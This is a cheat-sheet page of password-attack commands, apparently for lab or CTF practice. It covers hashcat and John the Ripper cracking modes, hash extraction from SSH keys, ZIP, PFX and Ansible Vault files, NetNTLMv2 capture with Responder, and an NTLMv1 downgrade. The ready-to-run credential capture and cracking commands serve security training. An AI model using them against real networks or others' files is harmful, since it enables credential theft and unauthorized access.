---
layout: page
title: Password Attacks
permalink: /cheatsheets/password-attacks/
---

## Hashcat

| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 3200 | bcrypt |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS (Kerberoasting) |
| 18200 | Kerberos AS-REP (AS-REP Roasting) |

### Crack MD5
```bash
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

### Crack bcrypt
```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

### Crack NetNTLMv2 (Responder capture)
```bash
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
```

### Crack Kerberoast TGS
```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

### Crack AS-REP roast hash
```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

## John the Ripper

### Crack with wordlist
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

### Crack with specific format
```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
```

### Show cracked passwords
```bash
john hash.txt --show
```

## Hash Extraction

### SSH private key → john hash
```bash
python3 ~/tools/ssh2john.py id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### ZIP file → john hash
```bash
zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### PFX certificate → john hash
```bash
pfx2john cert.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

### Ansible Vault → john hash
```bash
ansible2john vault_file.enc > vault.hash
john vault.hash --wordlist=/usr/share/wordlists/rockyou.txt
# Decrypt once password is known
ansible-vault decrypt vault_file.enc --vault-password-file vault_pass
```

## Responder — NetNTLMv2 Capture

### Start Responder on VPN interface
```bash
sudo python3 -W ignore /usr/share/responder/Responder.py -I tun0
```

### Shorter alias
```bash
sudo responder -I tun0
```

Captured hashes appear in `/usr/share/responder/logs/` and are cracked with hashcat `-m 5600`.

## Hashcat Mode Reference (Extended)

| Mode | Hash Type |
|------|-----------|
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos TGS RC4 (Kerberoasting) |
| 18200 | Kerberos AS-REP RC4 (AS-REP Roasting) |
| 19700 | Kerberos TGS AES-256 |
| 32200 | Kerberos AS-REP AES-256 |

## NTLMv1 Downgrade

Force a known challenge in Responder, then crack with rainbow tables.

```bash
# /etc/responder/Responder.conf → Challenge = 1122334455667788
sudo responder -I <interface> --lm --disable-ess
hashcat -m 5500 hash.txt rockyou.txt
# Rainbow table lookup: https://crack.sh/
```
